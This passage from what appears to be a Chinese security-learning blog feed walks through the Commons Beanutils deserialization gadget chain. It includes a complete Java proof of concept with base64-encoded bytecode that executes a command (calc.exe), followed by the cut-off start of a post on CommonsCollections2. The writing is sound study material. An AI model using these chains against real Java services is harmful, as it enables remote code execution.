    <content type="html"><![CDATA[<h1 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h1><p>前面我们讲完了cc链，接下来我们就开始cb链了，也就是<code>Commons Beanutils</code>，还好它只有一条链子，也要用到我们前面介绍过的<code>java.util.PriorityQueue</code>类</p><span id="more"></span><p>上一篇文章中我们已经介绍了<code>PriorityQueue</code>这个类了，它是一个优先队列，在反序列化这个对象之后，为了保证队列的顺序，它会进行重新排序，在重新排序的过程中会调用<code>Comparator.compare() </code>方法进行大小比较</p><h2 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h2><p>在进入正题之前，我们先来看看<code>Java</code>中的<code>JavaBean</code>类是什么；<code>JavaBean</code>是一种符合命名规范的<code>class</code>，它需要符合下列要求：</p><ol><li>若干个属性都是<code>private</code>类型</li><li>并且这些属性都有<code>public</code>类型的<code>get</code>和<code>set</code>方法</li><li>并且命名要符合规范，符合骆驼式命名法，比如说属性名为<code>abc</code>，那么<code>get</code>方法为<code>public Type getAbc()</code>，<code>set</code>方法为<code>public void setAbc(Type value)</code></li></ol><p>那么这种<code>class</code>就被称为<code>JavaBean</code>，其实也就是规范写法的类，比如说举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Arsene.Tang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一个很简单的<code>JavaBean</code></p><p>而在<code>commons-beanutils</code>中就提供了一种静态方法，可以让使用者直接调用到任意<code>JavaBean</code>对象中的<code>getter</code>方法，这个方法属实就很危险，它就是<code>PropertyUtils.getProperty</code>，用法也很简单，只有两个参数，前面是<code>JavaBean</code>对象，后面是想要获取的方法名，比如说：<code>PropertyUtils.getProperty(people,&quot;name&quot;)</code>，看看完整的代码：</p><p><img src="https://s2.loli.net/2022/03/09/1tMCwm3zWF7XxfD.png" alt="image.png"></p><p>这样就成功调用到了<code>people</code>对象的<code>getName()</code>和<code>getAge()</code>方法</p><p>并且<code>PropertyUtils.getProperty </code>还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取，这样就可以很方便的调用任意对象的<code>getter</code>方法，适用于在不确定<code>JavaBean</code>是哪个类对象时使用</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们在Java动态加载字节码中讲到了用<code>TemplatesImpl</code>类动态加载，一层一层的往上，推到了调用<code>newTransformer()</code>方法，然后慢慢往下调最终调用<code>defineClass()</code>加载字节码；其实在<code>newTransformer()</code>方法之前，还有一个方法可以调用到<code>newTransformer()</code>方法，而且它也是<code>public</code>类型，它就是<code>getOutputProperties()</code>方法，看看源码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>它也是一个<code>getter</code>方法，那我们自然就有一个思路了，我们能不能通过<code>PropertyUtils.getProperty</code>方法调用这个<code>getter</code>方法，最后成功加载字节码呢？只要能加载字节码我们就能执行任意命令了</p><p>首先，我们得先找到一个<code>java.util.Comparator</code>对象，在它的<code>compare()</code>方法中调用<code>PropertyUtils.getProperty</code>方法加载字节码，因为上篇文章中我们讲到了反序列化<code>PriorityQueue</code>对象之后，通过一系列的调用，最终调用到<code>comparator.compare()</code></p><p>而这个对象就是<code>org.apache.commons.beanutils.BeanComparator</code>，存在于<code>commons-beanutils</code>包中，我们看看它的<code>compare</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">( <span class="keyword">final</span> T o1, <span class="keyword">final</span> T o2 )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="keyword">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Object value1 = PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="keyword">final</span> Object value2 = PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很完美，里面正好就有<code>PropertyUtils.getProperty</code>，其实<code>BeanComparator</code>类是<code>commons-beanutils</code>用来比较两个<code>JavaBean</code>是否相等的类，它实现了<code>java.util.Comparator</code>接口，自然就会有<code>compare</code>方法；这个方法传入两个对象，如果<code>this.property</code>为空，则直接比较这两个对象；如果<code>this.property</code>不为空，则用<code>PropertyUtils.getProperty</code>分别取这两个对象的<code>this.property</code>属性，比较属性的值，不管怎么说，它就可以调用<code>getter</code>方法了，那么只要在<code>o1</code>这个位置上放我们构造好的<code>TemplatesImpl</code>对象，在<code>property</code>这个位置上放<code>OutputProperties</code>，那不就成功调用<code>TemplatesImpl#getOutputProperties()</code>方法了？</p><p>其实这里跟上一篇文章结合的是非常紧密的，如果你感觉有点昏建议回去复习复习哦</p><h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>最开始还是创建<code>TemplateImpl</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后实例化<code>BeanComparator</code>，这里先不设置<code>property</code>，防止报错，后面再用反射来操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br></pre></td></tr></table></figure><p>然后就是创建我们前面讲过的优先队列<code>PriorityQueue</code>，把这个<code>comparator</code>放进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>同样，还是先添加两个无害的对象1进去，防止出问题，因为我们刚开始时并没有设置<code>property</code>，当<code> this.property</code>为空时，相当于就是直接比较这两个对象，对这两个1进行排序，然后最后才把我们恶意的<code>outputProperties</code>和<code>TemplateImpl</code>设置进去，其实<code>queue</code>里面的第二个元素也不一定要是<code>obj</code>，随便一个对象都行，有一个<code>TemplateImpl</code>对象就够了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>所以说最后完整POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutils1_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/09/kmSJZyEXFxjAaL3.png" alt="image.png"></p><p>成功弹出计算器，下一篇文章来介绍用这条cb链来打<code>shiro</code>哈</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Beanutils&quot;&gt;&lt;a href=&quot;#Commons-Beanutils&quot; class=&quot;headerlink&quot; title=&quot;Commons Beanutils&quot;&gt;&lt;/a&gt;Commons Beanutils&lt;/h1&gt;&lt;p&gt;前面我们讲完了cc链，接下来我们就开始cb链了，也就是&lt;code&gt;Commons Beanutils&lt;/code&gt;，还好它只有一条链子，也要用到我们前面介绍过的&lt;code&gt;java.util.PriorityQueue&lt;/code&gt;类&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 2</title>
    <link href="https://arsenetang.github.io/2022/03/07/Java%E7%AF%87%E4%B9%8BCommonsCollections%202/"/>
    <id>https://arsenetang.github.io/2022/03/07/Java%E7%AF%87%E4%B9%8BCommonsCollections%202/</id>
    <published>2022-03-06T16:00:00.000Z</published>
    <updated>2022-03-07T13:58:54.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Collections-2"><a href="#Commons-Collections-2" class="headerlink" title="Commons Collections 2"></a>Commons Collections 2</h1><p>前面我们讲的cc链，都是基于<code>commons-collections:commons-collections</code>这个版本的，当时的版本号是3.2.1，也就是老版本；但后来实际上又有了新的分支，版本号为4.0，接下来我们就来看看在这个版本中存在的反序列化漏洞</p><span id="more"></span><p>这个新版本就是<code>org.apache.commons:commons-collections4</code>，<code>groupId</code>和<code>artifactId</code>都变了，为什么会分成两个不同的分支呢？因为当时官方认为旧的<code>commons-collections</code>有⼀些架构和<code>API</code>设计上的问题，但修复这些问题，会产⽣⼤量不能兼容的改动；所以说，<code>commons-collections4</code>不是用来替换<code>commons-collections</code>的一个新版本，而是一个新的包，两者的命名空间并不冲突，都可以放在同一个项目中，相当于就是一个拓展，那么之前版本中能利用的反序列化链，到了新版本中还能用吗？</p><h2 id="commons-collections4中有啥改动"><a href="#commons-collections4中有啥改动" class="headerlink" title="commons-collections4中有啥改动"></a>commons-collections4中有啥改动</h2><p>由于这两个版本可以共存，所以说我们就可以把它们两个包安装到同一个项目中进行比较，<code>ysoserial</code>中都装了，所以说直接在里面写POC就很方便，我们就拿cc6来演示嘛，毕竟这是一条通用链子，先把包名改改，把<code>import org.apache.commons.collections.*</code>改成<code>import org.apache.commons.collections4.*</code>如下图：</p><p><img src="https://s2.loli.net/2022/03/07/Z2sO8DgiElqymN4.png" alt="image.png"></p><p>这时候就会出现一个报错，因为<code>collections4</code>中的<code>LazyMap</code>里面并没有<code>decorate</code>这个方法，而是改了个名字，改成了<code>lazymap</code>，其它都是一样的，咱换个名字就能用了：<code>Map outerMap = LazyMap.lazyMap(innerMap, transformerChain);</code></p><p><img src="https://s2.loli.net/2022/03/07/feFsqMNp8WPA3cJ.png" alt="image.png"></p><p>成功弹出了计算器，说明了老的cc1、cc3、cc6都可以在新的<code>collections4</code>上继续使用</p><h2 id="PriorityQueue利⽤链"><a href="#PriorityQueue利⽤链" class="headerlink" title="PriorityQueue利⽤链"></a>PriorityQueue利⽤链</h2><p>除了几个老的以外，<code>ysoserial</code>还为<code>collections4</code>准备了几条新的利用链，那就是<code>CommonsCollections2</code>和<code>CommonsCollections4</code>，这两条链都是基于新的<code>collections4</code>特有的，但其实原理其实和前面的也差不了太多；前面分析了那么多链子，我们现在应该对cc链有概念了，cc链的核心，毫无疑问是<code>Transformer#transform()</code>，我们得想办法调入<code>transform</code>中，在里面去执行命令；而cc链的入口，就是<code>Serializable#readObject() </code>，所以说我们要做的，就是想办法把它们头尾连起来</p><p>而在<code>CommonsCollections2</code>中，有两个核心类，也就是链子的一头一尾：</p><p>一个是<code>java.util.PriorityQueue</code>，这个类中有自己的<code>readObject()</code>方法，所以说可以作为链子的开头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而另一个是<code>org.apache.commons.collections4.comparators.TransformingComparator</code>，这个类中有调用<code>transform()</code>方法的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这里就是链子的结尾，这条链子就是从<code>PriorityQueue</code>类中的<code>readObject()</code>方法到<code>TransformingComparator</code>类中的<code>compare()</code>方法；接下来我们就来看看它是怎么连接起来的：</p><p><code>PriorityQueue</code>类中的<code>readObject()</code>方法里面调用了<code>heapify()</code>，<code>heapify()</code>里面调用了<code>siftDown()</code>，<code>siftDown()</code>里面调用了<code>siftDownUsingComparator</code>，<code>siftDownUsingComparator</code>里面调用了<code>comparator.compare()</code>，就成功调用到上面<code>TransformingComparator</code>类中的<code>compare()</code>方法，这条链子就通了，整条链子简直不能再友好了，看看<code>siftDownUsingComparator</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">        &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有些数据结构的知识看得我也挺头大的，还好和这条链子没有太大关系，但还是跟着p神的文章稍微学学吧</p><p><code>java.util.PriorityQueue</code>是一个优先队列(<code>Queue</code>)，基于二叉堆实现，优先队列每次出队的元素都是优先级最高的元素，那么如何确定哪一个元素的优先级最高呢？<code>jdk</code>中使用堆这种数据结构，通过堆使得每次出队的元素总是队列里面最小的，而元素大小的比较方法则由<code>comparator</code>指定，相当于指定优先级</p><p>二叉堆是一种特殊的堆，是完全二叉树或者近似于完全二叉树，二叉堆分为最大堆和最小堆；最大堆：父节点的键值总是大于或等于任何一个子节点的键值，最小堆：父节点的键值总是小于或等于任何一个子节点的键值；而完全二叉树在第n层深度被填满之前，不会开始填第n+1层，而且元素插入是从左往右填满；所以说基于数组实现的二叉堆，对于数组中任意位置的n元素，其左孩子在[2n+1]位置上，右孩子在[2(n+1)]位置，它的父亲则在[(n-1)/2]上，而根的位置则是[0]，具体的请见：&lt;<a href="https://www.cnblogs.com/linghu-java/p/9467805.html">PriorityQueue源码分析 - linghu_java - 博客园 